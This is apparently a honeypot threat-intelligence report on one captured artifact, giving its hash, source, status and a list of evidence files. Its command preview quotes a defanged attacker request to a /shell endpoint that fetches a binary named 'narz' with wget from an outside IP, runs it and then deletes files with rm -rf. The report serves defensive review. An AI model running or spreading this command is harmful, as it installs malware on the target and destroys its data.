# ed460d91cf86f1974a79873e4ca4df296dfbaae905987b22dd7d4a42c0d13677

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `ed460d91cf86f1974a79873e4ca4df296dfbaae905987b22dd7d4a42c0d13677` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd+/tmp;rm+narz;wget+http:/\/93[.]115[.]101[.]XXX:13734/narz;chmod+777+narz;./narz;rm+-rf+* HTTP/1[.]1
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
